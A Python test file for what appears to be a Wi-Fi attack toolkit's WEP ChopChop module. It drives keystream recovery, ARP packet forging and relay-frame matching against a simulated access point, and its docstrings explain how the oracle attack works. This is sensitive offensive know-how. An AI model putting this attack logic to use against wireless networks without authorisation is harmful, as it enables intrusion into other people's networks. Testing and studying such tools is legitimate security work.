"""Offline tests for the WEP ChopChop daemon.

The live oracle (does the AP relay?) is hardware-verified by the probe; here we
prove the OFFLINE-testable core — the byte-walk keystream recovery + the RX
oracle matcher + the forge/handoff — by driving the daemon with a SIMULATED
oracle (decrypt the shortened frame with a known key, accept iff the ICV is
valid). If recovery reproduces the true keystream against that oracle, the
attack logic is correct; only the on-air relay-recognition needs the box.
"""
from __future__ import annotations

import asyncio
import zlib
from types import SimpleNamespace

from wifit3.engine.attacks.wep.chopchop import WepChopChop, _hdr_len
from wifit3.engine.attacks.wep.wep_crypto import (
    CRC32_RESIDUE,
    arp_request_plaintext,
    icv,
)

OUR = bytes.fromhex("02aabbccddee")
BSSID = "11:22:33:44:55:66"
KEY = b"abcde"
IV = bytes([0x11, 0x22, 0x33])


def _rc4(key: bytes, n: int) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(n)
    i = j = 0
    for k in range(n):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[k] = s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


def _arp_cipher(sender_ip, target_ip):
    """Build a realistic captured ARP cipher + its true keystream."""
    pt = arp_request_plaintext(sender_mac=OUR, sender_ip=sender_ip,
                               target_ip=target_ip)
    plain = pt + icv(pt)                       # 36 + 4 = 40
    ks = _rc4(IV + KEY, len(plain))
    cipher = bytes(p ^ k for p, k in zip(plain, ks))
    return cipher, ks


def _sim_oracle(iv: bytes, key: bytes):
    """Stand in for the AP: decrypt the shortened cipher; 'relay' iff the ICV
    residue is valid (exactly what the AP's ICV check does)."""
    async def oracle(short: bytes) -> bool:
        kstream = _rc4(iv + key, len(short))
        plain = bytes(c ^ k for c, k in zip(short, kstream))
        return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE
    return oracle


def _daemon(oracle=None):
    calls = []
    iface = SimpleNamespace(
        register_rx_callback=lambda c: None,
        unregister_rx_callback=lambda c: None,
    )
    d = WepChopChop(
        iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
        source_mac=OUR, on_forged_arp=lambda f: calls.append(f), oracle=oracle,
    )
    d._active = True
    d._cur_iv, d._cur_keyid = IV, 0
    return d, calls


# ---- byte-walk: backtracking DFS over relayed candidates -------------------

def _assert_valid_forged_arp(forged: bytes):
    """The forged frame decrypts (key abcde) to a well-formed broadcast ARP
    from us with a valid ICV — i.e. one the AP will relay."""
    body = forged[_hdr_len(forged[0], forged[1]):]
    assert body[:3] == IV                        # reused the target's IV
    plain = bytes(c ^ k for c, k in zip(body[4:], _rc4(IV + KEY, len(body) - 4)))
    snap_arp = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
    assert plain[:8] == snap_arp
    assert plain[16:22] == OUR                   # sender = our STA
    assert plain[-4:] == icv(plain[:-4])         # valid ICV


async def test_chop_and_forge_recovers_and_forges_valid_arp():
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    d, _ = _daemon(oracle=_sim_oracle(IV, KEY))
    forged = await d._chop_and_forge(cipher)
    assert forged is not None
    _assert_valid_forged_arp(forged)


async def test_chop_and_forge_none_when_ap_silent():
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))

    async def never(_short):
        return False
    d, _ = _daemon(oracle=never)
    assert await d._chop_and_forge(cipher) is None


async def test_dfs_backtracks_past_a_decoy_response():
    """The crux: if the AP relays MORE than one byte at a step, we don't have
    to know which is real — we try each; a wrong (decoy) byte's sub-walk
    dead-ends and we backtrack to the true one. Here guess 0x00 is a decoy that
    relays (swept before the true 0xd8); the DFS must back out of it."""
    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    base = _sim_oracle(IV, KEY)
    decoy_short = chop_last_byte_and_fixup(cipher, 0x00)   # wrong, but "relays"

    async def with_decoy(short: bytes) -> bool:
        if short == decoy_short:
            return True                          # decoy: a bogus extra response
        return await base(short)

    d, _ = _daemon(oracle=with_decoy)
    forged = await d._chop_and_forge(cipher)
    assert forged is not None                    # backtracked past the decoy
    _assert_valid_forged_arp(forged)


async def test_skips_seed_that_is_not_an_arp_request():
    """A broadcast frame that's ARP-SIZED but not an ARP request decrypts (in
    the recovered tail) to a non-zero target-MAC — the assumed prefix is wrong,
    so the forge can't work. We detect it from the chopped keystream and skip,
    rather than wasting the brute / failing silently (the "23/24 then nada")."""
    data = bytearray(36)
    data[26:32] = b"\xde\xad\xbe\xef\x11\x22"     # non-zero target MAC ⇒ not a req
    plain = bytes(data) + icv(bytes(data))
    ks = _rc4(IV + KEY, len(plain))
    cipher = bytes(p ^ k for p, k in zip(plain, ks))
    logs = []
    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
                    source_mac=OUR, on_forged_arp=lambda f: None,
                    log_callback=logs.append, oracle=_sim_oracle(IV, KEY))
    d._active = True
    d._cur_iv, d._cur_keyid, d._cur_cipher = IV, 0, cipher
    forged = await d._chop_and_forge(cipher)
    assert forged is None
    assert any("NOT an ARP request" in m for m in logs)


async def test_find_all_accepted_rejects_unconfirmed_spurious_relay():
    """A wrong guess that relays only ONCE (echo / timing slip) is rejected by
    the re-confirm step, so it doesn't even enter the DFS branch set."""
    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
    cipher, ks_true = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    true_last = cipher[-1] ^ ks_true[-1]              # 0xd8
    s_true = chop_last_byte_and_fixup(cipher, true_last)
    s_spurious = chop_last_byte_and_fixup(cipher, 0)  # wrong, swept first
    fired = {"n": 0}

    async def flaky(short: bytes) -> bool:
        if short == s_true:
            return True
        if short == s_spurious and fired["n"] == 0:
            fired["n"] += 1
            return True                              # one-shot (won't re-confirm)
        return False

    d, _ = _daemon(oracle=flaky)
    responders = await d._find_all_accepted(cipher)
    assert fired["n"] == 1                            # spurious offered…
    assert responders == [true_last]                  # …but only the true byte


async def test_succeed_hands_forged_arp_to_campaign_and_stops():
    cipher, _ = _arp_cipher(bytes([192, 168, 1, 50]), bytes([192, 168, 1, 1]))
    d, calls = _daemon(oracle=_sim_oracle(IV, KEY))
    forged = await d._chop_and_forge(cipher)
    d._succeed(forged)
    assert d.is_active is False                  # immediate handoff stopped it
    assert calls == [forged]
    _assert_valid_forged_arp(calls[0])


# ---- stop() halts an in-flight walk (campaign Stop IVs tears chop down) ----

async def test_stop_halts_an_in_flight_byte_walk():
    """Regression: clicking Stop IVs calls campaign.stop() → chop.stop(); the
    long byte-walk must actually end (not orphan after the buttons hide)."""
    captured = (bytes([0x08, 0x42, 0, 0]) + b"\xff" * 6
                + bytes.fromhex("aa:bb:cc:dd:ee:06") + OUR + b"\x00\x00"
                + IV + b"\x00" + bytes(40))               # 68B broadcast WEP

    async def slow(_short):           # never relays → keeps the walk sweeping
        await asyncio.sleep(0.003)
        return False

    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID),
                    SimpleNamespace(arp_candidates=lambda b: [captured]),
                    source_mac=OUR, on_forged_arp=lambda f: None, oracle=slow)
    d.start()
    await asyncio.sleep(0.02)         # let the walk get in-flight
    assert d.is_active
    task = d._task
    d.stop()
    await asyncio.sleep(0.05)         # let the cancellation deliver
    assert not d.is_active
    assert task.done()               # the loop actually ended (no orphan)


# ---- the live-AP oracle matcher (RX callback) ------------------------------

def _relay_frame(sa=OUR, fc1=0x42, da=b"\xff" * 6, fc0=0x08, pad=40):
    return (bytes([fc0, fc1]) + b"\x00\x00" + da + bytes.fromhex("aa:bb:cc:dd:ee:06")
            + sa + b"\x00\x00" + b"\xab\xcd\xef\x00" + b"\x00" * pad)


def test_rx_oracle_fires_on_pinned_relay():
    d, _ = _daemon()
    relay = _relay_frame()
    d._expected_relay_len = len(relay)
    d._rx_cb(relay, -40, 0.0)
    assert d._relay_seen


def test_rx_oracle_ignores_non_matching():
    d, _ = _daemon()
    d._expected_relay_len = len(_relay_frame())
    d._rx_cb(_relay_frame(sa=bytes.fromhex("020000000099")), -40, 0.0)  # not us
    assert not d._relay_seen
    d._rx_cb(_relay_frame(fc1=0x41), -40, 0.0)        # ToDS (our own inject)
    assert not d._relay_seen
    d._rx_cb(_relay_frame(da=OUR), -40, 0.0)          # unicast DA
    assert not d._relay_seen
    d._rx_cb(_relay_frame(fc0=0x80), -40, 0.0)        # mgmt, not data
    assert not d._relay_seen


def test_rx_oracle_rejects_stale_echo_of_wrong_length():
    """The sibling-BSS echo of the PREVIOUS byte is 1 longer than this guess's
    expected relay — it must NOT be accepted (that bug stalled the walk)."""
    d, _ = _daemon()
    d._expected_relay_len = len(_relay_frame())        # this byte's expectation
    d._rx_cb(_relay_frame(pad=41), -40, 0.0)           # previous byte's relay (+1B)
    assert not d._relay_seen
